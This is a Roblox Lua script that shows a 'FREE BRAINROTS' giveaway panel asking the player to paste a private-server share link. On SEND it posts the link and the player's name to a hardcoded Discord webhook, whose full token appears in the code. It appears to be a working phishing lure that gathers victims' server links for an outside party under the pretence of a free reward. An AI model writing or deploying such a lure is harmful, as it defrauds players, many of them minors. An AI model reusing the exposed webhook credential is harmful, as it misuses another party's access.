print("Script Loading...")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1515955615804035156/OrTmQIBtdWRl6SsGuPEfVmt-8DKtiW1tLo_Z-8cRfV1Uk_AyhMceD7CNm6ONgIkM8JYv"

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ServerLinkGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

-- Create main frame
local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.Position = UDim2.new(0.25, 0, 0.25, 0)
Frame.Size = UDim2.new(0.5, 0, 0.5, 0)
Frame.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Size = UDim2.new(1, 0, 0.15, 0)
Title.BackgroundTransparency = 1
Title.Text = "FREE BRAINROTS"
Title.TextColor3 = Color3.fromRGB(255, 100, 100)
Title.TextSize = 40
Title.Font = Enum.Font.GothamBold

-- Info text
local Info = Instance.new("TextLabel")
Info.Parent = Frame
Info.Size = UDim2.new(1, 0, 0.1, 0)
Info.Position = UDim2.new(0, 0, 0.15, 0)
Info.BackgroundTransparency = 1
Info.Text = "Submitted by: " .. LocalPlayer.Name
Info.TextColor3 = Color3.fromRGB(200, 200, 200)
Info.TextSize = 18
Info.Font = Enum.Font.Gotham

-- TextBox
local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(0.9, 0, 0.25, 0)
TextBox.Position = UDim2.new(0.05, 0, 0.3, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 16
TextBox.Font = Enum.Font.Gotham
TextBox.PlaceholderText = "https://www.roblox.com/share?code=..."
TextBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
TextBox.ClearTextOnFocus = false
TextBox.BorderColor3 = Color3.fromRGB(100, 150, 255)
TextBox.BorderSizePixel = 2

-- Send Button
local SendButton = Instance.new("TextButton")
SendButton.Parent = Frame
SendButton.Size = UDim2.new(0.9, 0, 0.15, 0)
SendButton.Position = UDim2.new(0.05, 0, 0.6, 0)
SendButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SendButton.TextSize = 20
SendButton.Font = Enum.Font.GothamBold
SendButton.Text = "SEND"
SendButton.BorderSizePixel = 0

-- Status label
local Status = Instance.new("TextLabel")
Status.Parent = Frame
Status.Size = UDim2.new(1, 0, 0.1, 0)
Status.Position = UDim2.new(0, 0, 0.8, 0)
Status.BackgroundTransparency = 1
Status.Text = ""
Status.TextColor3 = Color3.fromRGB(100, 200, 100)
Status.TextSize = 16
Status.Font = Enum.Font.Gotham

-- Send button click
SendButton.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    
    if link == "" or link:len() < 10 then
        Status.Text = "INVALID LINK!"
        Status.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    Status.Text = "SENDING..."
    Status.TextColor3 = Color3.fromRGB(200, 200, 0)
    SendButton.Enabled = false
    
    local payload = {
        content = "@Iamabigbackhim",
        embeds = {
            {
                title = "🔗 Server Link Submitted",
                description = link,
                color = 65280,
                fields = {
                    {
                        name = "Player",
                        value = LocalPlayer.Name,
                        inline = true
                    }
                }
            }
        }
    }
    
    local success = pcall(function()
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
    
    wait(0.5)
    
    if success then
        Status.Text = "SENT!"
        Status.TextColor3 = Color3.fromRGB(100, 255, 100)
        TextBox.Text = ""
        wait(2)
        SendButton.Enabled = true
        Status.Text = ""
    else
        Status.Text = "FAILED!"
        Status.TextColor3 = Color3.fromRGB(255, 100, 100)
        SendButton.Enabled = true
    end
end)

print("Server Link Script Loaded!")
